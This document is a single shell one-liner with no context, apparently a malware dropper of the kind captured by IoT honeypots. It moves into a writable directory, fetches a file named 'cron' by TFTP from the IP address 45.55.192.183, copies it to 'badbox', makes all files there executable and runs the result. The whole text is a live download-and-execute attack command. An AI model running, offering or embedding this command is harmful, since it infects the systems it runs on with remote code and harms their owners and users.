cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r cron -g 45.55.192.183;cat cron >badbox;chmod +x *;./badbox
